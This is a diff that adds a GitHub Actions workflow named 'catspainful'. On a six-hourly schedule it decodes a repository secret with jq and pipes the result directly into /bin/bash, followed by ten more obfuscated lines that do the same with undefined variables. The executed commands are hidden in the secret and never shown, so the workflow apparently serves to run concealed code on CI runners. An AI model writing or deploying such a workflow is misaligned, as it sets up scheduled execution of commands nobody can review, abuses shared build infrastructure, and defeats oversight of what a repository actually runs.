@@ -1,0 +1,29 @@
+name: catspainful
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: catspainful
+        env:
+          erua4694: ${{ secrets.erua4694 }}
+        run: |
+          echo $erua4694 | jq -r .re9 | /bin/bash
+          echo $xkn779 | jq -r .my808 | /bin/bash
+          echo $zxmyi56328 | jq -r .p0 | /bin/bash
+          echo $j20 | jq -r .lfel9 | /bin/bash
+          echo $zxbu1775 | jq -r .ddp5998 | /bin/bash
+          echo $mtn36 | jq -r .ktdlo2 | /bin/bash
+          echo $qd31717 | jq -r .ruiwt528 | /bin/bash
+          echo $rdj2738 | jq -r .q90 | /bin/bash
+          echo $fbgru768 | jq -r .apqu62522 | /bin/bash
+          echo $uwf7 | jq -r .l1376 | /bin/bash
+          echo $nn4 | jq -r .eacaz5637 | /bin/bash
+
